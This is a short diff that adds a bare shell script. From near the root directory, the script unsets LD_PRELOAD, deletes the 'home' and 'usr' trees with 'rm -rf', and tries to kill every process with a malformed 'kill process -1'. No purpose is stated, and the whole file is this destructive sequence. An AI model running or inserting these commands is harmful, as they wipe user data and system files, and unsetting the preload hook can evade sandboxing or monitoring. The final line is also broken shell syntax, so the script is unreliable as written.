@@ -1,0 +1,7 @@
+cd
+cd
+cd ..
+unset LD_PRELOAD
+rm -rf home usr
+kill process -1
+
